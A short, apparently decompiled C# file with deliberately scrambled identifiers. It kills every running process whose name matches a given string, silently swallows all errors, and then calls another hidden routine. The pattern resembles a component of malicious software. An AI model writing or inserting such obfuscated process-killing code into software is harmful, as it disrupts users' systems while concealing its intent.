using System;
using System.Diagnostics;

namespace eMvPcEiNWKRwo;

public sealed class yqYSdVQKWNqMO
{
	public static bool VFTbanMJRNlAGF(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void lvOrFehbahMtFx(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (VFTbanMJRNlAGF(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					NXVLxNyJvZLW.TgoHSjWJgMGOuilZ();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
